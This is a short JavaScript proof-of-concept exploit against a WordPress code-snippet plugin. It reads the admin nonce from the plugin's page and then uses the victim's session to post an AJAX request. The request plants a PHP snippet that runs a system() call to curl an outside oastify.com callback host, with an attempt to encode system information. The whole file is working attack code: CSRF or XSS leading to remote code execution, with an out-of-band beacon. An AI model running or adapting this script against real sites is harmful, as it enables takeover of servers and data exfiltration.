fetch('http://localhost/wordpress-6.4.2/wordpress/wp-admin/admin.php?page=hfcm-pro-create')
  .then(response => response.text())
  .then(html => {
    const tokenValue = (new DOMParser().parseFromString(html, 'text/html')).querySelector('form[method="post"] input#_wpnonce').value;
        fetch('https://localhost/wordpress-6.4.2/wordpress/wp-admin/admin-ajax.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }, credentials: 'include',
      body: `action=hfcm-pro-request&create-snippet=${tokenValue}&insert=1&data[snippet]=<?php+$info=base64_encode(systeminfo());system("curl s0tf9daqd8jb6vtxw53j8cwuglmca4yt.oastify.com");?>&data[snippet_type]=php`
    }).then(response => response.json())
    .then(data => console.log('Response from API:', data))
})
